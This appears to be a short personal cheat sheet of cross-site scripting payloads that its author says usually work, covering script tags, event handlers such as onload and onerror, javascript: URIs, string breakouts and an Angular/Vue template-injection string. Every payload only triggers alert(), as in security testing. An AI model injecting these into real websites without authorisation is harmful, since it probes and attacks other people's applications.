<h1> 🚀Most Common Working Payloads </h1>
<h2> This is list of XSS Payloads that worked in most cases for me

```html "><svg/onload=alert(1)>``` - Length bypass Svg Payload </br>
```html "><script>alert(1)</script>``` - Basic XSS Payload with script tag </br>
```html <div onmouseover="alert(document.domain);">``` - Onmouseover XSS Payload </br>
```html <IMG SRC="javascript:alert('XSS');">``` - Image XSS Directive Payload </br>
```html </style><script>a=eval;b=alert;a(b(/XSS/.source));</script>``` - Style Special Combination </br>
```html "><img src=x onerror=alert(1)>``` - Typical Image XSS Payload </br>
```html {{constructor.constructor(`alert(1)`)()}}``` - This is technically CSTI, but it is escalated to XSS for better Impact. It works mostly on Angular/Vue Applications. You can explore more about Template Injections on Internet </br>
```html <BODY onload=alert(1)>``` - Body Payload </br>
```html <BASE HREF="javascript:alert('XSS');//">``` - XSS with Base Tag </br>
```html &apos;-alert(1)-&apos;``` - Injecting alert inside HTML tag + HTML Encoding </br>
```html <IMG SRC=javascript:alert(&quot;XSS&quot;)>``` - Image Payload with HTML Entities </br>
```'-alert(1)-'```
```\';alert(document.domain)//``` - Inject Alert inside JS String </br>
```javascript:alert(1)``` - Works in many ways and combination, also can help escalating Open Redirect to XSS </br>
```http://www.<script>alert(1)</script .com```


<h2>by Kira Reys
